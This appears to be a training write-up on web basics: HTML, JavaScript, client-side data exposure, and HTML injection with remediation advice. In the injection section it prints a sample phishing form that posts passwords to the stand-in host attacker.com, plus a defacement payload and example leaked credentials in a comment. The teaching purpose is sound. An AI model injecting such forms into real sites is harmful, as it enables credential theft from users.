# How Websites Work: Core Components, Data Exposure & HTML Injection

## Overview
Web application penetration testing requires a direct understanding of client-side architecture. Browsers render applications by compiling Hypertext Markup Language (HTML), Cascading Style Sheets (CSS), and client-side JavaScript. 

This assessment breaks down:
1. Core browser rendering and client-server delivery.
2. HTML structure, tags, and DOM tree construction.
3. JavaScript execution contexts and dynamic manipulation.
4. Client-side sensitive data exposure via DOM inspection.
5. HTML Injection mechanics, impact, and remediation.

---

## Task 1: How Websites Work

Websites are delivered over HTTP/HTTPS from a web daemon (Apache, Nginx, Node.js) to the client browser.

```text
Client (Browser) ─── HTTP GET / ───► Web Server
Client (Browser) ◄── HTML/CSS/JS ── Web Server
        │
        ▼
[ DOM Construction ] ──► [ CSSOM Tree ] ──► [ Render Tree ] ──► [ JS Engine (V8/SpiderMonkey) ]
```

* **HTML:** Defines structure, layout, input controls, and data presentation.
* **CSS:** Dictates visual formatting, layout rules, and media responsiveness.
* **JavaScript:** Implements dynamic client-side functionality, API polling (`fetch`/`AJAX`), and DOM interaction.

---

## Task 2: HTML (Hypertext Markup Language)

HTML uses paired and self-closing tags to define elements. Every element forms a node inside the Document Object Model (DOM).

### Essential Structural Components
* **Document Envelope:** `<!DOCTYPE html>`, `<html>`, `<head>`, `<body>`.
* **Metadata & Assets (`<head>`):** `<title>`, `<meta>`, external scripts (`<script src="...">`), and stylesheets (`<link rel="stylesheet">`).
* **Input Interfaces (`<form>`):**
  * `<form action="/login" method="POST">`
  * Text fields: `<input type="text" name="username">`
  * Passwords: `<input type="password" name="password">`
  * Hidden controls: `<input type="hidden" name="csrf_token" value="...">`

### Security Relevance
Forms dictate how parameters reach back-end endpoints. Security testers inspect form targets, HTTP methods (`GET` vs. `POST`), and hidden input fields that developers assume end-users cannot modify.

---

## Task 3: JavaScript

JavaScript runs directly inside the client browser engine. It has read and write access to the DOM, local storage, session storage, and cookies.

### Mechanics & Interactivity
* **DOM Traversal & Manipulation:**
  ```javascript
  document.getElementById("demo").innerHTML = "Updated Content";
  ```
* **Event Listeners:**
  ```javascript
  document.querySelector("button").addEventListener("click", function() {
      fetch("/api/data");
  });
  ```
* **Security Context:** 
  Client-side validation (e.g., character restrictions, password length checks, disabled buttons) is executed entirely within the user's browser. Because an attacker can disable, modify, or bypass JavaScript via developer tools or an intercepting proxy (Burp Suite), client-side controls provide **zero security boundary**.

---

## Task 4: Sensitive Data Exposure

### The Client-Side Attack Surface
A web browser receives all source assets in clear text to render the page. Developers frequently leak sensitive information under the mistaken assumption that hidden, styled, or unrendered assets are inaccessible.

### Common Exposure Locations
1. **HTML Comments:**
   * Developers leave administrative notes, internal endpoints, and deprecation notices directly inside source comments:
     ```html
     <!-- TODO: Remove debug credentials: admin:TestPass123! -->
     <!-- Deprecated API: /api/v1/internal_users -->
     ```
2. **Hidden Form Elements:**
   * Values like prices, role IDs, or permission levels hidden from the visual UI:
     ```html
     <input type="hidden" name="role" value="user">
     <input type="hidden" name="item_price" value="49.99">
     ```
3. **Embedded Client-Side Logic:**
   * Hardcoded API keys, JWT secrets, staging hostnames, and disabled features embedded in referenced `.js` files.

### Triage & Extraction
* Open Developer Tools (`F12` or `Ctrl+Shift+I`).
* **Elements Tab:** Live DOM structure and hidden attributes.
* **Sources / Debugger Tab:** Loaded JavaScript libraries, configuration bundles, and source maps.
* **Network Tab:** XHR/Fetch queries transmitting JSON payloads in the background.

---

## Task 5: HTML Injection

### Mechanics
HTML Injection occurs when a web application accepts untrusted user input and embeds it directly into the web page's HTML structure without proper sanitization, output encoding, or validation.

```text
Attacker Input: <h1>Website Defaced</h1>
Server Output:  <div>Search results for: <h1>Website Defaced</h1></div>
```

Because the browser cannot distinguish between original application markup and the user-supplied tags, it executes the injected tags as part of the page layout.

### Attack Vectors & Impact
* **Visual Defacement:** Injecting formatting tags (`<h1>`, `<marquee>`, `<div>`) to alter website structure or display misleading announcements.
* **Credential Harvesting (Phishing):** Injecting custom malicious forms directly into an authenticated application:
  ```html
  <form action="[http://attacker.com/steal](http://attacker.com/steal)">
      <h3>Session timed out. Re-enter password:</h3>
      <input type="password" name="loot">
      <input type="submit" value="Login">
  </form>
  ```
* **Bridge to Client-Side Execution:** If the application permits HTML tags without sanitizing `<script>` tags, event handlers (`onload`, `onerror`), or anchor schemes (`javascript:`), HTML injection escalates directly into **Stored or Reflected Cross-Site Scripting (XSS)**.

---

## Remediation

1. **Context-Aware Output Encoding:** 
   Encode all dynamic, user-supplied content before rendering it in the browser. Characters with structural meaning in HTML must be converted to character entities:
   * `<` $\rightarrow$ `&lt;`
   * `>` $\rightarrow$ `&gt;`
   * `&` $\rightarrow$ `&amp;`
   * `"` $\rightarrow$ `&quot;`
   * `'` $\rightarrow$ `&#x27;`
2. **Never Trust Client-Side Validation:** 
   Validate all data types, lengths, and business logic strictly on the server side.
3. **Purge Comments in Production Builds:** 
   Implement CI/CD minification pipelines that strip HTML, CSS, and JS comments before deploying to public web servers.
